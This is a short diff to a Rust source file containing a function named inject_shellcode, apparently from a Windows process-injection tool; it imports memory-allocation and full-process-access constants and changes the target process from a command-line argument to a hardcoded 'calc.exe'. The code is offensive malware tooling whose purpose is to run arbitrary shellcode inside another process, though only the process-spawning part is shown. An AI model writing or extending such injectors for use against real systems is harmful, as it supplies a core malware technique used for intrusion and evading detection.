@@ -2,11 +2,8 @@ use std::{process::Command, ptr::null_mut};
 use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
 
 pub fn inject_shellcode(shellcode: &[u8]) {
-    let args: Vec<String> = std::env::args().collect();
-    let proc_name = &args[1];
-
     //start process
-    let mut spawned_process = Command::new(proc_name);
+    let mut spawned_process = Command::new("calc.exe");
 
     //Get PID of process
     let process = spawned_process.spawn().unwrap();
